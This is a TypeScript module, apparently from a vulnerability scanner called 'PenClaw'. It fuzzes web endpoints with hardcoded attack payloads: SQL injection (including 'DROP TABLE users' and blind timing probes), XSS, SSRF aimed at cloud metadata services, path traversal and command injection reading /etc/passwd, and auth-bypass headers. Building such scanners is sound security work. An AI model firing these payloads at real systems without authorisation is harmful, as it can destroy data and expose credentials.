import { request } from "undici";
import type { DiscoveredEndpoint, Payload, RawFinding, ScannerResult } from "../types/index.js";

// ---------------------------------------------------------------------------
// Payload loading — prefer data/payloads/ files (created by Agent A), fall
// back to hardcoded payloads if the loader or files don't exist yet.
// ---------------------------------------------------------------------------

let _loadPayloads: ((category: string) => Payload[]) | undefined;

async function initPayloadLoader(): Promise<void> {
  if (_loadPayloads !== undefined) return;
  try {
    const mod = await import("../utils/payloads.js");
    _loadPayloads = mod.loadPayloads;
  } catch {
    // Module doesn't exist yet — Agent A is creating it.
    _loadPayloads = undefined;
  }
}

function getPayloads(category: string): Payload[] {
  if (_loadPayloads) {
    try {
      return _loadPayloads(category);
    } catch {
      // Fall through to hardcoded
    }
  }
  return fallbackPayloads[category] ?? [];
}

const fallbackPayloads: Record<string, Payload[]> = {
  sqli: [
    { value: "' OR '1'='1", technique: "error-based", description: "Classic OR injection" },
    { value: "1; DROP TABLE users--", technique: "stacked", description: "Stacked query" },
    { value: "' UNION SELECT NULL--", technique: "union-based", description: "Union probe" },
  ],
  xss: [
    { value: '<script>alert(1)</script>', technique: "html-context", description: "Script tag" },
    { value: '"><img src=x onerror=alert(1)>', technique: "attribute-context", description: "Attribute breakout" },
  ],
  ssrf: [
    { value: "http://169.254.169.254/latest/meta-data/", technique: "cloud-metadata", description: "AWS metadata" },
    { value: "http://metadata.google.internal/computeMetadata/v1/", technique: "cloud-metadata", description: "GCP metadata" },
    { value: "http://169.254.169.254/metadata/instance?api-version=2021-02-01", technique: "cloud-metadata", description: "Azure IMDS" },
    { value: "http://127.0.0.1/", technique: "localhost", description: "Localhost" },
    { value: "http://[::1]/", technique: "localhost", description: "IPv6 localhost" },
    { value: "http://0x7f000001/", technique: "localhost", description: "Hex localhost" },
    { value: "file:///etc/passwd", technique: "protocol-smuggling", description: "File protocol" },
  ],
  "path-traversal": [
    { value: "../../../etc/passwd", technique: "unix", description: "Unix path traversal" },
    { value: "..\\..\\..\\windows\\system32\\config\\sam", technique: "windows", description: "Windows path traversal" },
  ],
  nosql: [
    { value: '{"$gt":""}', technique: "operator-injection", description: "NoSQL $gt" },
    { value: '{"$ne":null}', technique: "operator-injection", description: "NoSQL $ne" },
  ],
  command: [
    { value: "; ls /", technique: "semicolon", description: "Semicolon injection" },
    { value: "| cat /etc/passwd", technique: "pipe", description: "Pipe injection" },
    { value: "$(whoami)", technique: "subshell", description: "Subshell injection" },
  ],
};

const injectionGroups = [
  { name: "sql-injection", category: "injection", payloadCategory: "sqli" },
  { name: "nosql-injection", category: "injection", payloadCategory: "nosql" },
  { name: "command-injection", category: "injection", payloadCategory: "command" },
  { name: "path-traversal", category: "path-traversal", payloadCategory: "path-traversal" },
  { name: "xss-reflected", category: "xss", payloadCategory: "xss" },
];

const authBypassHeaders: Array<{ name: string; headers: Record<string, string> }> = [
  { name: "X-Forwarded-For bypass", headers: { "X-Forwarded-For": "127.0.0.1" } },
  { name: "X-Original-URL bypass", headers: { "X-Original-URL": "/admin" } },
  { name: "X-Rewrite-URL bypass", headers: { "X-Rewrite-URL": "/admin" } },
];

// ---------------------------------------------------------------------------
// Concurrency semaphore
// ---------------------------------------------------------------------------

class Semaphore {
  private running = 0;
  private queue: Array<() => void> = [];

  constructor(private readonly max: number) {}

  async acquire(): Promise<void> {
    if (this.running < this.max) {
      this.running++;
      return;
    }
    await new Promise<void>((resolve) => this.queue.push(resolve));
    this.running++;
  }

  release(): void {
    this.running--;
    const next = this.queue.shift();
    if (next) next();
  }
}

// ---------------------------------------------------------------------------
// SSRF parameter names heuristic
// ---------------------------------------------------------------------------

const SSRF_PARAM_PATTERN = /^(url|uri|path|file|src|dest|redirect|next|target|link|callback|return|goto|ref)$/i;
const SSRF_RESPONSE_KEYWORDS = /ami-id|instance-id|computeMetadata|meta-data|iam\/security-credentials|hostname|local-ipv4|placement\/availability-zone/i;

// ---------------------------------------------------------------------------
// Blind SQLi — time-based payloads
// ---------------------------------------------------------------------------

const TIME_BASED_PAYLOADS: Payload[] = [
  { value: "' OR SLEEP(5)-- ", technique: "time-based", description: "MySQL SLEEP", dbms: "mysql" },
  { value: "'; SELECT pg_sleep(5);-- ", technique: "time-based", description: "PostgreSQL pg_sleep", dbms: "postgresql" },
  { value: "'; WAITFOR DELAY '0:0:5';-- ", technique: "time-based", description: "MSSQL WAITFOR DELAY", dbms: "mssql" },
  { value: "' OR 1=1 AND SLEEP(5)-- ", technique: "time-based", description: "MySQL conditional SLEEP", dbms: "mysql" },
  { value: "1' AND (SELECT * FROM (SELECT SLEEP(5))a)-- ", technique: "time-based", description: "MySQL subquery SLEEP", dbms: "mysql" },
];

// ---------------------------------------------------------------------------
// Blind SQLi — boolean-based payloads (true/false pairs)
// ---------------------------------------------------------------------------

const BOOLEAN_PAIRS: Array<{ truePayload: Payload; falsePayload: Payload }> = [
  {
    truePayload: { value: "' OR '1'='1' -- ", technique: "boolean-based", description: "True condition" },
    falsePayload: { value: "' OR '1'='2' -- ", technique: "boolean-based", description: "False condition" },
  },
  {
    truePayload: { value: "1 OR 1=1", technique: "boolean-based", description: "Numeric true" },
    falsePayload: { value: "1 OR 1=2", technique: "boolean-based", description: "Numeric false" },
  },
  {
    truePayload: { value: "' OR 1=1#", technique: "boolean-based", description: "Hash-commented true" },
    falsePayload: { value: "' OR 1=2#", technique: "boolean-based", description: "Hash-commented false" },
  },
];

// ---------------------------------------------------------------------------
// Main entry point
// ---------------------------------------------------------------------------

export async function fuzzEndpoints(
  endpoints: DiscoveredEndpoint[],
  baseUrl: string,
  options?: { maxConcurrentRequests?: number; requestDelayMs?: number },
): Promise<ScannerResult> {
  const startedAt = Date.now();
  const warnings: string[] = [];
  const findings: RawFinding[] = [];

  const maxConcurrent = options?.maxConcurrentRequests ?? 10;
  const delayMs = options?.requestDelayMs ?? 0;
  const semaphore = new Semaphore(maxConcurrent);

  await initPayloadLoader();

  const limited = endpoints.slice(0, 30);

  try {
    const tasks: Array<Promise<void>> = [];

    for (const endpoint of limited) {
      tasks.push(runWithSemaphore(semaphore, delayMs, async () => {
        findings.push(...await fuzzSingleEndpoint(endpoint, semaphore, delayMs));
      }));
      tasks.push(runWithSemaphore(semaphore, delayMs, async () => {
        findings.push(...await testAuthBypass(endpoint));
      }));
      tasks.push(runWithSemaphore(semaphore, delayMs, async () => {
        findings.push(...await testIdor(endpoint));
      }));
      tasks.push(runWithSemaphore(semaphore, delayMs, async () => {
        findings.push(...await detectTimeBased(endpoint));
      }));
      tasks.push(runWithSemaphore(semaphore, delayMs, async () => {
        findings.push(...await detectBooleanBased(endpoint));
      }));
      tasks.push(runWithSemaphore(semaphore, delayMs, async () => {
        findings.push(...await testSsrfParameters(endpoint));
      }));
    }

    await Promise.all(tasks);
  } catch (error) {
    warnings.push(`API fuzzing failed: ${error instanceof Error ? error.message : String(error)}`);
  }

  return { scanner: "fuzzer", findings, warnings, executionMs: Date.now() - startedAt };
}

async function runWithSemaphore(semaphore: Semaphore, delayMs: number, fn: () => Promise<void>): Promise<void> {
  await semaphore.acquire();
  try {
    if (delayMs > 0) await delay(delayMs);
    await fn();
  } finally {
    semaphore.release();
  }
}

function delay(ms: number): Promise<void> {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

// ---------------------------------------------------------------------------
// Classic injection fuzzing
// ---------------------------------------------------------------------------

async function fuzzSingleEndpoint(
  endpoint: DiscoveredEndpoint,
  semaphore: Semaphore,
  delayMs: number,
): Promise<RawFinding[]> {
  const findings: RawFinding[] = [];

  for (const group of injectionGroups) {
    const payloads = getPayloads(group.payloadCategory);
    for (const payload of payloads) {
      try {
        await semaphore.acquire();
        try {
          if (delayMs > 0) await delay(delayMs);
          const url = buildFuzzedUrl(endpoint.url, endpoint.parameters, payload.value);
          const { statusCode, body: bodyStream } = await request(url, {
            method: endpoint.method as "GET" | "POST",
            headers: {
              "User-Agent": "PenClaw/0.1.0 Security Scanner",
              "Content-Type": "application/x-www-form-urlencoded",
            },
            body: endpoint.method === "POST" ? buildPostBody(endpoint.parameters, payload.value) : undefined,
            signal: AbortSignal.timeout(5_000),
          });

          const body = await bodyStream.text();

          if (isErrorResponse(body, group.name)) {
            findings.push({
              id: `fuzz-${group.name}-${endpoint.url}-${findings.length}`,
              source: "fuzzer",
              ruleId: `fuzzer-${group.name}`,
              title: `Potential ${group.name} in ${endpoint.url}`,
              description: `The endpoint ${endpoint.url} returned an error response when injected with a ${group.name} payload, suggesting the input is not properly sanitized.`,
              severity: group.category === "injection" ? "high" : "medium",
              category: group.category,
              locations: [{ path: endpoint.url, snippet: payload.value }],
              metadata: {
                statusCode,
                payload: payload.value,
                technique: payload.technique,
                method: endpoint.method,
                responseSnippet: body.slice(0, 300),
              },
            });
            break; // One confirmed payload per group per endpoint
          }
        } finally {
          semaphore.release();
        }
      } catch {
        // Request failed — skip
      }
    }
  }

  return findings;
}

// ---------------------------------------------------------------------------
// Time-based blind SQLi detection
// ---------------------------------------------------------------------------

export async function detectTimeBased(endpoint: DiscoveredEndpoint): Promise<RawFinding[]> {
  const findings: RawFinding[] = [];
  if (endpoint.parameters.length === 0) return findings;

  // Measure baseline response time (average of 2 requests)
  let baselineMs: number;
  try {
    const times: number[] = [];
    for (let i = 0; i < 2; i++) {
      const start = Date.now();
      const { body } = await request(endpoint.url, {
        method: endpoint.method as "GET" | "POST",
        headers: { "User-Agent": "PenClaw/0.1.0 Security Scanner" },
        signal: AbortSignal.timeout(10_000),
      });
      await body.text();
      times.push(Date.now() - start);
    }
    baselineMs = times.reduce((a, b) => a + b, 0) / times.length;
  } catch {
    return findings;
  }

  // Try time-delay payloads
  const payloads = getPayloads("sqli").filter((p) => p.technique === "time-based");
  const timingPayloads = payloads.length > 0 ? payloads : TIME_BASED_PAYLOADS;

  for (const payload of timingPayloads) {
    try {
      const url = buildFuzzedUrl(endpoint.url, endpoint.parameters, payload.value);
      const start = Date.now();
      const { body } = await request(url, {
        method: endpoint.method as "GET" | "POST",
        headers: {
          "User-Agent": "PenClaw/0.1.0 Security Scanner",
          "Content-Type": "application/x-www-form-urlencoded",
        },
        body: endpoint.method === "POST" ? buildPostBody(endpoint.parameters, payload.value) : undefined,
        signal: AbortSignal.timeout(15_000),
      });
      await body.text();
      const elapsed = Date.now() - start;

      // If response took >5x baseline and at least 4 seconds, likely blind SQLi
      if (elapsed > baselineMs * 5 && elapsed > 4_000) {
        findings.push({
          id: `fuzz-blind-sqli-time-${endpoint.url}-${payload.dbms ?? "unknown"}`,
          source: "fuzzer",
          ruleId: "fuzzer-blind-sqli-time-based",
          title: `Time-based blind SQL injection in ${endpoint.url}`,
          description: `The endpoint responded in ${elapsed}ms (baseline: ${Math.round(baselineMs)}ms) when injected with a time-delay payload, confirming blind SQL injection.`,
          severity: "critical",
          category: "injection",
          locations: [{ path: endpoint.url, snippet: payload.value }],
          metadata: {
            payload: payload.value,
            technique: "time-based-blind",
            dbms: payload.dbms,
            baselineMs: Math.round(baselineMs),
            responseMs: elapsed,
            method: endpoint.method,
          },
        });
        break; // One confirmed is enough
      }
    } catch {
      // Timeout or error — might also indicate success but we play safe
    }
  }

  return findings;
}

// ---------------------------------------------------------------------------
// Boolean-based blind SQLi detection
// ---------------------------------------------------------------------------

export async function detectBooleanBased(endpoint: DiscoveredEndpoint): Promise<RawFinding[]> {
  const findings: RawFinding[] = [];
  if (endpoint.parameters.length === 0) return findings;

  for (const pair of BOOLEAN_PAIRS) {
    try {
      const trueUrl = buildFuzzedUrl(endpoint.url, endpoint.parameters, pair.truePayload.value);
      const falseUrl = buildFuzzedUrl(endpoint.url, endpoint.parameters, pair.falsePayload.value);

      const [trueResp, falseResp] = await Promise.all([
        request(trueUrl, {
          method: endpoint.method as "GET" | "POST",
          headers: {
            "User-Agent": "PenClaw/0.1.0 Security Scanner",
            "Content-Type": "application/x-www-form-urlencoded",
          },
          body: endpoint.method === "POST" ? buildPostBody(endpoint.parameters, pair.truePayload.value) : undefined,
          signal: AbortSignal.timeout(5_000),
        }),
        request(falseUrl, {
          method: endpoint.method as "GET" | "POST",
          headers: {
            "User-Agent": "PenClaw/0.1.0 Security Scanner",
            "Content-Type": "application/x-www-form-urlencoded",
          },
          body: endpoint.method === "POST" ? buildPostBody(endpoint.parameters, pair.falsePayload.value) : undefined,
          signal: AbortSignal.timeout(5_000),
        }),
      ]);

      const trueBody = await trueResp.body.text();
      const falseBody = await falseResp.body.text();

      // Significant difference in body length (>20%) suggests boolean blind
      const maxLen = Math.max(trueBody.length, falseBody.length);
      if (maxLen === 0) continue;
      const diff = Math.abs(trueBody.length - falseBody.length) / maxLen;

      if (diff > 0.2) {
        findings.push({
          id: `fuzz-blind-sqli-boolean-${endpoint.url}-${findings.length}`,
          source: "fuzzer",
          ruleId: "fuzzer-blind-sqli-boolean-based",
          title: `Potential boolean-based blind SQL injection in ${endpoint.url}`,
          description: `True/false condition payloads produced responses with ${Math.round(diff * 100)}% body length difference (true: ${trueBody.length}, false: ${falseBody.length}), suggesting boolean-based blind SQL injection.`,
          severity: "high",
          category: "injection",
          locations: [{ path: endpoint.url, snippet: pair.truePayload.value }],
          metadata: {
            truePayload: pair.truePayload.value,
            falsePayload: pair.falsePayload.value,
            technique: "boolean-based-blind",
            trueLengthBytes: trueBody.length,
            falseLengthBytes: falseBody.length,
            diffPercent: Math.round(diff * 100),
            method: endpoint.method,
          },
        });
        break;
      }
    } catch {
      // Skip
    }
  }

  return findings;
}

// ---------------------------------------------------------------------------
// SSRF testing
// ---------------------------------------------------------------------------

export async function testSsrfParameters(endpoint: DiscoveredEndpoint): Promise<RawFinding[]> {
  const findings: RawFinding[] = [];

  const ssrfParams = endpoint.parameters.filter((p) => SSRF_PARAM_PATTERN.test(p));
  if (ssrfParams.length === 0) return findings;

  const payloads = getPayloads("ssrf");
  const ssrfPayloads = payloads.length > 0 ? payloads : (fallbackPayloads["ssrf"] ?? []);

  for (const param of ssrfParams) {
    for (const payload of ssrfPayloads) {
      try {
        const urlObj = new URL(endpoint.url);
        urlObj.searchParams.set(param, payload.value);

        const { body: bodyStream } = await request(urlObj.href, {
          method: endpoint.method as "GET" | "POST",
          headers: {
            "User-Agent": "PenClaw/0.1.0 Security Scanner",
            "Content-Type": "application/x-www-form-urlencoded",
          },
          body: endpoint.method === "POST" ? `${encodeURIComponent(param)}=${encodeURIComponent(payload.value)}` : undefined,
          signal: AbortSignal.timeout(5_000),
        });

        const body = await bodyStream.text();

        if (SSRF_RESPONSE_KEYWORDS.test(body)) {
          findings.push({
            id: `fuzz-ssrf-${param}-${endpoint.url}-${findings.length}`,
            source: "fuzzer",
            ruleId: "fuzzer-ssrf",
            title: `SSRF detected via parameter '${param}' in ${endpoint.url}`,
            description: `The parameter '${param}' accepted an SSRF payload and the response contained cloud metadata or internal resource indicators.`,
            severity: "critical",
            category: "ssrf",
            locations: [{ path: endpoint.url, snippet: `${param}=${payload.value}` }],
            metadata: {
              parameter: param,
              payload: payload.value,
              technique: payload.technique,
              method: endpoint.method,
              responseSnippet: body.slice(0, 300),
            },
          });
          break; // One confirmed per param is enough
        }
      } catch {
        // Skip
      }
    }
  }

  return findings;
}

// ---------------------------------------------------------------------------
// Auth bypass + IDOR (unchanged logic, kept for completeness)
// ---------------------------------------------------------------------------

async function testAuthBypass(endpoint: DiscoveredEndpoint): Promise<RawFinding[]> {
  const findings: RawFinding[] = [];

  let baselineStatus: number;
  try {
    const { statusCode } = await request(endpoint.url, {
      method: endpoint.method as "GET" | "POST",
      headers: { "User-Agent": "PenClaw/0.1.0 Security Scanner" },
      signal: AbortSignal.timeout(5_000),
    });
    baselineStatus = statusCode;
  } catch {
    return findings;
  }

  if (baselineStatus === 200) return findings;

  for (const bypass of authBypassHeaders) {
    try {
      const { statusCode } = await request(endpoint.url, {
        method: endpoint.method as "GET" | "POST",
        headers: {
          "User-Agent": "PenClaw/0.1.0 Security Scanner",
          ...bypass.headers,
        },
        signal: AbortSignal.timeout(5_000),
      });

      if (statusCode === 200 && baselineStatus !== 200) {
        findings.push({
          id: `fuzz-auth-bypass-${bypass.name}-${endpoint.url}`,
          source: "fuzzer",
          ruleId: "fuzzer-auth-bypass",
          title: `Authentication bypass via ${bypass.name}`,
          description: `The endpoint ${endpoint.url} returned 200 when using ${bypass.name} header, but returned ${baselineStatus} without it.`,
          severity: "critical",
          category: "auth-bypass",
          locations: [{ path: endpoint.url, snippet: JSON.stringify(bypass.headers) }],
          metadata: { bypassMethod: bypass.name, baselineStatus, bypassStatus: statusCode },
        });
      }
    } catch {
      // Skip
    }
  }

  return findings;
}

async function testIdor(endpoint: DiscoveredEndpoint): Promise<RawFinding[]> {
  const findings: RawFinding[] = [];

  const idMatch = endpoint.url.match(/\/(\d+)(?:\/|$|\?)/);
  if (!idMatch) return findings;

  const originalId = idMatch[1]!;
  const testIds = [
    String(Number(originalId) + 1),
    String(Number(originalId) - 1),
    "1",
    "0",
  ];

  try {
    const { statusCode: originalStatus, body: originalBody } = await request(endpoint.url, {
      method: "GET",
      headers: { "User-Agent": "PenClaw/0.1.0 Security Scanner" },
      signal: AbortSignal.timeout(5_000),
    });
    const originalText = await originalBody.text();

    if (originalStatus !== 200) return findings;

    for (const testId of testIds) {
      const testUrl = endpoint.url.replace(`/${originalId}`, `/${testId}`);
      try {
        const { statusCode, body: testBody } = await request(testUrl, {
          method: "GET",
          headers: { "User-Agent": "PenClaw/0.1.0 Security Scanner" },
          signal: AbortSignal.timeout(5_000),
        });
        const testText = await testBody.text();

        if (statusCode === 200 && testText !== originalText && testText.length > 50) {
          findings.push({
            id: `fuzz-idor-${endpoint.url}-${testId}`,
            source: "fuzzer",
            ruleId: "fuzzer-idor",
            title: `Potential IDOR: different data returned for ID ${testId}`,
            description: `Changing the ID parameter from ${originalId} to ${testId} returned different content, suggesting missing authorization checks.`,
            severity: "high",
            category: "idor",
            locations: [{ path: testUrl }],
            metadata: { originalId, testId, originalUrl: endpoint.url },
          });
          break;
        }
      } catch {
        // Skip
      }
    }
  } catch {
    // Skip
  }

  return findings;
}

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

function buildFuzzedUrl(url: string, params: string[], payload: string): string {
  if (params.length === 0) return url;
  const urlObj = new URL(url);
  for (const param of params) {
    urlObj.searchParams.set(param, payload);
  }
  return urlObj.href;
}

function buildPostBody(params: string[], payload: string): string {
  if (params.length === 0) return `test=${encodeURIComponent(payload)}`;
  return params.map((p) => `${encodeURIComponent(p)}=${encodeURIComponent(payload)}`).join("&");
}

function isErrorResponse(body: string, payloadType: string): boolean {
  if (payloadType.includes("sql")) {
    return /sql.*error|syntax.*error|mysql|postgres|sqlite|ORA-\d|ODBC|unclosed.*quotation/i.test(body);
  }
  if (payloadType.includes("command")) {
    return /root:|bin\/|\/etc\/passwd|uid=\d|drwx/i.test(body);
  }
  if (payloadType.includes("path")) {
    return /root:|bin\/|\/etc\/passwd|\[boot loader\]|NTLDR/i.test(body);
  }
  if (payloadType.includes("xss")) {
    return body.includes("<script>alert(1)</script>") || body.includes('onerror=alert(1)');
  }
  return false;
}
